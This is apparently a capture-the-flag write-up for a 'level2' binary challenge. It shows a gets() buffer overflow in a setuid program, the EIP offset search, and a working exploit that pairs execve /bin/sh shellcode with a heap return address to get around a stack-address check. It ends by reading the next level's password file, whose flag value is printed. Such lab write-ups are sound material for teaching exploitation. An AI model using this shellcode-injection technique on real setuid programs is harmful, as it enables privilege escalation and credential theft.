# Level2

## 1. Context

```bash
$ id
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)

$ pwd
/home/user/level2

$ ls -la
[...]
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
[...]
```

## 2. Program behavior

Testing it :
```bash
$ ./level2
a
a
```

Expects an input and prints it, nothing else...

## 3. Code overview

`main()` calls the function `p()`

`p()` calls the function `gets()` which is vulnerable to **buffer overflows**.
Unfortunately, `p()` a basic anti-shellcode protection.

## 4. Exploit

Let's try our program with a huge input :
```bash
$ /level2
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

0x55 -> U -> Offset = 80

The offset for overwrite EIP is 80.

For the exploit, we can't overwrite and use a stack address, because there is a check in the code

This code check if we try to overwrite the stack. The program quit if we do it :
```c
if ((check & 0xb0000000) == 0xb0000000) {
	printf("(%p)\n", check);
	exit(1);
}
```

Let's use a shellcode : https://shell-storm.org/shellcode/files/shellcode-575.html

Here is our exploit :
```bash
$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
```

## 5. Getting the flag

```bash
$ cat /tmp/exploit - | ./level2 
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```

End of simulation
